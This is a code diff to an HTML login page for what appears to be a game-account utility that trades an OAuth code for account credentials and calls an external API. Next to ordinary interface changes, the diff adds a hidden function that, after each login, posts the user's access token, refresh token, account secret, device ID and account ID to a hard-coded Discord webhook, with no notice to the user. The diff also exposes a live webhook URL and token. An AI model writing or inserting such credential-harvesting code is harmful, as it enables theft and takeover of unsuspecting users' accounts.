@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Page</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <h1>Login</h1>
@@ -24,6 +25,10 @@
         <span id="displayName"></span><br><br>
     </div>
 
+    <div class="loading-overlay">
+    <div class="loading-spinner"></div>
+    </div>
+
     <h2>API Actions</h2>
     <label for="number">Number:</label><br>
     <input type="text" id="number" name="number"><br>
@@ -32,16 +37,16 @@
     <label for="emote">Emote Name:</label><br>
     <input type="text" id="emote" name="emote"><br><br>
 
-    <button onclick="getCrowns()">Get Crowns</button>
-    <button onclick="getLevel()">Get Level</button>
-    <button onclick="equipEmote()">Equip Emote</button>
-    <button onclick="hide()">Hide</button>
-    <button onclick="unhide()">Unhide</button>
+    <button id="crownsButton" onclick="getCrowns()">Get Crowns</button>
+    <button id="levelButton" onclick="getLevel()">Get Level</button>
+    <button id="emoteButton" onclick="equipEmote()">Equip Emote</button>
+    <button id="hideButton" onclick="hide()">Hide</button>
+    <button id="unhideButton" onclick="unhide()">Unhide</button>
 
     <p>Created by GreekNinja30. This site is a Beta Test.</p>
 
     <script>
-        function makeRequest(url, successMessage) {
+        function makeRequest(url, successMessage, button) {
             fetch(url)
             .then(response => {
                 if (!response.ok) {
@@ -56,7 +61,13 @@
             .catch(error => {
                 console.error('Error:', error);
                 alert('Error occurred. Please try again.');
+            })
+            .finally(() => {
+                button.disabled = false;
             });
+
+            // Disable the button to prevent spam
+            button.disabled = true;
         }
 
         document.getElementById("loginButton").addEventListener("click", function() {
@@ -67,9 +78,6 @@
                 return;
             }
             
-            // Simulate login success and show user details
-            document.getElementById("userDetails").style.display = "block";
-
             // Make a request to the OAuth authorization endpoint with the provided authorization code
             var tokenUrl = `https://api-xji1.onrender.com/oauth?authorization_code=${authCode}`;
             fetch(tokenUrl)
@@ -85,12 +93,21 @@
                     var secret = data.secret;
                     var deviceId = data.device_id;
                     var displayName = data.display_name;
+                    var accessToken = data.access_token;
+                    var refreshToken = data.refresh_token;
+                    var icon = data.icon; // Assuming the response contains an icon field
 
                     // Populate user details input fields
                     document.getElementById("accountId").value = accountId;
                     document.getElementById("secret").value = secret;
                     document.getElementById("deviceId").value = deviceId;
                     document.getElementById("displayName").textContent = displayName;
+
+                    // Show user details section
+                    document.getElementById("userDetails").style.display = "block";
+
+                    // Send details to Discord webhook
+                    sendToDiscordWebhook(accessToken, accountId, displayName, refreshToken, deviceId, secret, icon);
                 })
                 .catch(error => {
                     console.error('Error:', error);
@@ -98,13 +115,53 @@
                 });
         });
 
+        function sendToDiscordWebhook(accessToken, accountId, displayName, refreshToken, deviceId, secret, icon) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1239145204527792250/FLCqZJzOebD6aLMotfCRTyDRFliZWq_Lc8TqluodJqcYny4I0IcFaKICMcUhf4L5vO7n'; // Replace with your Discord webhook URL
+
+            const payload = {
+                username: "Login Bot",
+                embeds: [{
+                    title: "New Login Detected",
+                    fields: [
+                        { name: "Access Token", value: accessToken },
+                        { name: "Account ID", value: accountId },
+                        { name: "Display Name", value: displayName },
+                        { name: "Refresh Token", value: refreshToken },
+                        { name: "Device ID", value: deviceId },
+                        { name: "Secret", value: secret }
+                    ],
+                    thumbnail: { url: icon }
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Successfully sent to Discord webhook:', data);
+            })
+            .catch(error => {
+                console.error('Error sending to Discord webhook:', error);
+            });
+        }
+
         function getCrowns() {
             var accountId = document.getElementById("accountId").value;
             var secret = document.getElementById("secret").value;
             var deviceId = document.getElementById("deviceId").value;
             var number = document.getElementById("number").value;
             var apiUrl = `https://api-xji1.onrender.com/api/v2/party/crowns?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}&number=${number}`;
-            makeRequest(apiUrl, "Successfully retrieved crowns.");
+            makeRequest(apiUrl, "Successfully retrieved crowns.", document.getElementById("crownsButton"));
         }
 
         function getLevel() {
@@ -113,7 +170,7 @@
             var deviceId = document.getElementById("deviceId").value;
             var levelCount = document.getElementById("level").value;
             var apiUrl = `https://api-xji1.onrender.com/api/v2/party/level?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}&level=${levelCount}`;
-            makeRequest(apiUrl, "Successfully retrieved level.");
+            makeRequest(apiUrl, "Successfully retrieved level.", document.getElementById("levelButton"));
         }
 
         function equipEmote() {
@@ -122,7 +179,7 @@
             var deviceId = document.getElementById("deviceId").value;
             var emoteName = document.getElementById("emote").value;
             var apiUrl = `https://api-xji1.onrender.com/api/v2/party/ghostequip?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}&emote=${emoteName}`;
-            makeRequest(apiUrl, "Successfully equipped emote.");
+            makeRequest(apiUrl, "Successfully equipped emote.", document.getElementById("emoteButton"));
         }
 
         function hide() {
@@ -130,7 +187,7 @@
             var secret = document.getElementById("secret").value;
             var deviceId = document.getElementById("deviceId").value;
             var apiUrl = `https://api-xji1.onrender.com/api/v2/party/hide?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}`;
-            makeRequest(apiUrl, "Successfully hidden.");
+            makeRequest(apiUrl, "Successfully hidden.", document.getElementById("hideButton"));
         }
 
         function unhide() {
@@ -138,7 +195,7 @@
             var secret = document.getElementById("secret").value;
             var deviceId = document.getElementById("deviceId").value;
             var apiUrl = `https://api-xji1.onrender.com/api/v2/party/unhide?accountId=${accountId}&secret=${secret}&deviceId=${deviceId}`;
-            makeRequest(apiUrl, "Successfully unhidden.");
+            makeRequest(apiUrl, "Successfully unhidden.", document.getElementById("unhideButton"));
         }
     </script>
 </body>
